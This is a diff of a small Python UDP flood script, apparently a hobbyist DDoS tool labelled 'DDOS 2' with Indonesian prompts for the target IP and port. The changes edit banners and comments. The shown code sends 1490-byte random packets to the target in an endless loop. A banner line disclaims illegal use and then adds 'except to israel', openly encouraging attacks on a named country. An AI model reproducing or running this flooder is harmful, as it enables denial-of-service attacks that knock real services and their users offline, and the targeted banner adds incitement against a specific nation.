@@ -19,9 +19,14 @@ bytes = random._urandom(1490)
 
 #terminal clear all session
 os.system("clear")
+
+#terminal display DDOS 2 as figlet
 os.system("figlet DDOS 2")
+
+#display text use echo
 os.system("echo 'dont use for illegal activities'")
 time.sleep(1)
+
 os.system("echo 'except to israel'")
 time.sleep(2)
 #Bannerku
@@ -36,10 +41,14 @@ port = input("Masukkan Port : ")
 
 #Run Untuk Terminal
 os.system("clear")
-os.system("toilet Attack Starting")
 
 time.sleep(0.5)
+os.system("echo 'Attack Starting...'")
+
+time.sleep(1)
 print("Wait a seccond...")
+time.sleep(0.5)
+
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
